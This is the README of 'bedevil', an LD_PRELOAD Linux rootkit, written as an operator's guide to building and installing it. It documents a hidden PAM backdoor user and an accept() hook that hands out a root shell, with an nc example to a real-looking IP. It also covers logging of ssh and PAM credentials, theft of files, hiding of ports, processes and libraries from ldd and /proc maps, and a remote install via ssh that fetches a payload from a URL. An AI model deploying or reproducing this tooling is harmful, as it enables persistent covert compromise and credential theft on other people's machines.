

# bedevil

<img src="https://i.imgur.com/PyO00vy.png">

</br>

 * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
 * bedevil is designed to be more robust, faster and efficient than vlany.

## Aim of bedevil
 * Ultimately, my core aim is to tidy up previously existing aspects of precursor rootkits, fix outstanding issues and create a more manageable & _robust_ system of rootkit functionalities.
 * This is in an effort to make it easier on (not just) me when it comes to managing the rootkit's different functionalities.
 * In addtion, considering the point above, I have also made an effort to optionally minimalise the amount of dependencies required to install the kit on a machine.

</hr>

## Important files
*(inc/)*
 * [__toggles.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h): rootkit functionality toggles. read for more info
 * [__stdincludes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/stdincludes.h): just standard headers
 * [__includes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/includes.h): read for info
 * [__bedevil.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.h): essential rootkit header, handled solely by bedevil.sh
 * [__bedevil.c__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.c): centre for all bedevil

</hr>

## `bedevil.sh`
```
$ ./bedevil.sh -h

   /$$                     /$$                   /$$/$$
  | $$                    | $$                  |__| $$
  | $$$$$$$  /$$$$$$  /$$$$$$$ /$$$$$$ /$$    /$$/$| $$
  | $$__  $$/$$__  $$/$$__  $$/$$__  $|  $$  /$$| $| $$
  | $$  \ $| $$$$$$$| $$  | $| $$$$$$$$\  $$/$$/| $| $$
  | $$  | $| $$_____| $$  | $| $$_____/ \  $$$/ | $| $$
  | $$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$$  \  $/  | $| $$
  |_______/ \_______/\_______/\_______/   \_/   |__|__/
                                                     
               LD_PRELOAD Linux rootkit

  Usage: $0 [option(s)]
      Options:
          -h: Show this help message & exit.
          -v: Output verbosely.
          -e: Do an environment check. (RECOMMENDED)
          -u: Enable use of 'dialog' throughout setup.
          -t: Go through & switch rootkit toggles.
          -C: Clean up installation/compilation mess.
          -d: Configure rootkit headers & settings.
          -z: After configuration has finished, compress the resulting
              new include directory with gzip.
          -c: Compile rootkit in current directory & exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)

```
 * __The order in which you use the flags is essential.__
 * *Compile only (no installation):* `./bedevil.sh -dc` (will quickly compile the .so in the your cwd)  
 * *Changing variable values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
 * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
 * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
 * **Compressing include directory & using resulting tarball**:
     * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
     * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
     * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`


## `auto.sh`
```
$ ./auto.sh

Usage: ./auto.sh <option> <path or url>
    Specified file must be the base64 result of
    compressing bdvl's new include directory with
    tar gzip upon completing configuration.

    Options: -u: Download and use a file from online.
             -l: Use a file on the local filesystem.

```
 * Automatic and instantaneous installation script for use with preconfigured installations.
 * Specified file must be the resulting base64 encoded tar.gz archive created after `bedevil.sh -zd`.
   * Use a file available locally, or give a URL to said file.
   * File is written as base64 by bedevil.sh for the sake of easier transfers between machines.
 * This script depends solely on the contents and the format of the 'settings' file within the compressed include directory.
 * Additionally, there should be no need to edit anything within `auto.sh`.
 * At the stage this script is currently in, utilising the dynamic linker patch isn't as straight forward as it should/I'd like it to be.

### Full example installation using `auto.sh` after `bedevil.sh`
 * `BD_UNAME=[...] BD_PWD=[...] [...] ./bedevil.sh -vdz`
 * Then upload resulting new \*.so.inc.b64 somewhere. In this case, 'https://lmao.rofl/libsydflm.so.inc.b64'
 * `scp auto.sh root@host:/tmp/ && ssh root@host 'bash /tmp/auto.sh https://lmao.rofl/libsydflm.so.inc.b64'`
 * Rootkit will then be installed as per usual, just in a fraction of the time compared to before.
   * One slight issue is that the `patch_sshdconfig` function in `etc/postinstall.sh` doesn't get executed.
   * Small price to pay & if that's such an issue you can do it yourself.

</hr>

## Rootkit toggles
 * [`inc/toggles.h`](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h) is just exactly as it sounds. By (un)defining different toggle definitions, you have more control what bedevil can & will do upon installation. Comments available.  
 * [`etc/toggles.sh`](https://github.com/naworkcaj/bdvl/blob/master/etc/toggles.sh) is used by bedevil.sh to read, parse, and make changes to toggles.h without manual editing.

| Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
| :-------------   | :----------------------------------------------------------- | :------------- | :--------- | :--------- |
| `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | off            | libpam     | no         |
| `USE_ACCEPT_BD`  | allows backdoor connection via running (& infected) services | off            | -          | no         |
| `ACCEPT_USE_SSL` | to use SSL or not for the accept hook backdoor               | off            | libssl     | no         |
| `LOG_LOCAL_AUTH` | log local successful user authentications                    | off            | libpam     | no         |
| `HIDE_SELF`      | hides files and processes based on rootkit magic GID         | on             | -          | yes        |
| `HIDE_HOOKS`     | hides malicious function hooking from dlsym                  | on             | -          | yes        |
| `FORGE_MAPS`     | hides rootkit presence from process map files                | on             | -          | yes        |
| `HIDE_PORTS`     | hides ports & port ranges defined in 'hide_ports' file       | on             | -          | yes        |
| `DO_REINSTALL`   | maintains the rootkit's preload file                         | on             | -          | yes        |
| `DO_EVASIONS`    | hides rootkit presence from unsavoury processes              | on             | -          | yes        |
| `HIDING_UTIL`    | allows backdoor user to hide & unhide files on-the-fly       | on             | -          | yes        |
| `LOG_SSH`        | logs outgoing ssh logins to install dir                      | off            | -          | no         |
| `FILE_STEAL`     | attempts to steal FoI when opened by open/fopen              | off            | -          | no         |
| `LINK_IF_ERR`    | link said FoI if we can't copy it                            | off            | -          | yes        |
| `USE_CRYPT`      | to use or not to use libcrypt                                | on             | libcrypt   | yes        |

</hr>

## Feature information

#### Credential logging
 * When toggle `LOG_LOCAL_AUTH` is defined, bedevil intercepts function `pam_vprompt` and stores successful user authentications in the rootkit's installation directory.
 * When toggle `LOG_SSH` is defined, bedevil intercepts functions `read` and `write` to check if a user is attempting to log into an account via ssh.
   * It's up to you to verify if the credentials used for logging into the account are correct, since the server in question will handle that.
   * The written logs are available, too, in the rootkit's installation directory.

### Evasions & presence hiding

#### Network port hiding
 * With bedevil installed, you can manually hide or unhide any specific ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
 * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
i.e.:
```
$ cat hide_ports
4291
304-306
1000-1003
```
*Where a hyphen represents a range...*
 * Upon installation, `bedevil.sh` will write which ports or port ranges should be hidden to the `hide_ports` file.

#### Rootkit presence hiding
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is fully installed will make it seem apparent that there is no malicious libraries being preloaded.
 * _HOWEVER_, should dependencies be required by the rootkit's compiled shared object, the dependent libraries will be visible in output. (namely; libcrypt & libssl)

##### Scary things
 * bedevil will hide from defined scary processes, paths or environment variables.
 * See [`inc/hiding/evasion/evasion.h`](https://github.com/naworkcaj/bdvl/blob/master/inc/hiding/evasion/evasion.h) for the things that bedevil will (do its utmost best) to hide from.
 * Subsequently subverting detection by temporarily 'uninstalling' the rootkit until given scary item has finished execution.
 * i.e.: Calling `ldd` on a dynamically linked binary will not reveal the location of the rootkit.
   * Initially, calling `ldd` as a regular user will appear to show an incorrect permissions error, as the regular user doesn't have sufficient permissions required to be able to temporarily uninstall the rootkit.
   * Calling `ldd` with sufficient permissions will uninstall the rootkit, show "clean" output to the user, then will reinstall. Obscuring the location of the rootkit.

#### Backdoor
Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section closer to the beginning of this README. Also, there is a [README inside the rootkit's installation directory](https://github.com/naworkcaj/bdvl/blob/master/etc/BD_README) that you may wish to consult.  
When bedevil detects that a backdoor user is logged in, it automatically unsets specified environment variables, for the sake of remaining hidden... See [`inc/util/bdusr.c`](https://github.com/naworkcaj/bdvl/blob/master/inc/util/bdusr.c) for the things that bedevil will unset in the environment upon detecting a present backdoor user/general rootkit process.

##### PAM
 * By hijacking libpam's authentication functions, we create a phantom user on the machine that can be logged into just the same as any other user.
 * During setup, you'll be given a username and password which can be used to log into the backdoor, over ssh.
   * To reiterate, by default the username and password are randomly generated, but you can specify a username and password of your own by setting them before running `bedevil.sh`.
     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
 * See [`etc/ssh.sh`](https://github.com/naworkcaj/bdvl/blob/master/etc/ssh.sh) on connecting to the infected box's PAM backdoor with your hidden port.
 * *By hooking the responsible [utmp & wtmp functions](https://github.com/naworkcaj/bdvl/tree/master/inc/utmp), information that may give off indication of a PAM backdoor is throttled.*
 * *On boxes that use `systemd` (which is most), when a user (real-or-not) is logged in, a process called `(sd-pam)` will be visible.*

##### accept() hook
 * By intercepting and hijacking libc's accept(), we can connect to existing services (__assuming they have been restarted upon installation__) on a box and have them drop us a reverse shell if special conditions are met.
 * When using `ACCEPT_PORT` as your local source port when connecting to said box, bedevil will drop you the shell when you correctly enter your backdoor password. (`BD_PWD`)
 * `ACCEPT_PORT` is by default a hidden port in `'hide_ports'`.

###### SSL
 * If toggle `ACCEPT_USE_SSL` is defined, the source port you should use to trigger the use of SSL within the backdoor is just `$ACCEPT_PORT + 1`.
   * *The plaintext backdoor is still available even when `ACCEPT_USE_SSL` is defined.*


 * Example connection to infected box (*where host is `213.82.46.164`, `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*)
```
$ nc 213.82.46.164 22 -p 839
my_password
...
uid=0(root) gid=666 groups=666
...
```



<!--

RANDOM NOTES:
  having DO_EVASIONS enabled allows a 'bug' where a root user can
  'permanently' uninstall the rootkit by running ldd through an infinite
  loop. i.e.: `while true; do ldd /bin/echo; done`
  after this loop is interrupted, bedevil will reinstall itself, assuming
  its necessary shared object file is present.


LINKS OF INTEREST:
 - https://pastebin.com/rZvjDzFK

asddsadsad

-->
